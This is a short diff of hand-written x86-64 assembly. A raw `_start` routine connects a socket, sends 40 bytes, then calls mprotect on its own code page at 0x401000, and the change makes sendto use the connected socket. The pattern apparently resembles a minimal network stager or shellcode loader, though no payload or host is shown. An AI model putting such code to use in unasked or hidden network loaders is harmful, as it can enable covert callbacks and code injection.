@@ -51,17 +51,17 @@ _start:
 	movl	$0x10,%edx
 	syscall
 	cmpl	$0xffffffff,%eax
-	je	.L3
+	je	.L2
 	movl	$0x2c,%eax
 	movl	0x58(%rsp),%edi
 	leaq	(%rsp),%rsi
 	movl	$0x28,%edx
 	xorl	%r10d,%r10d
-	leaq	0x40(%rsp),%r8
-	movl	$0x10,%r9d
+	xorl	%r8d,%r8d
+	xorl	%r9d,%r9d
 	syscall
 	cmpl	$0x28,%eax
-	jne	.L3
+	jne	.L2
 	movl	$0xa,%eax
 	movl	$0x401000,%edi
 	movl	$0x1000,%esi
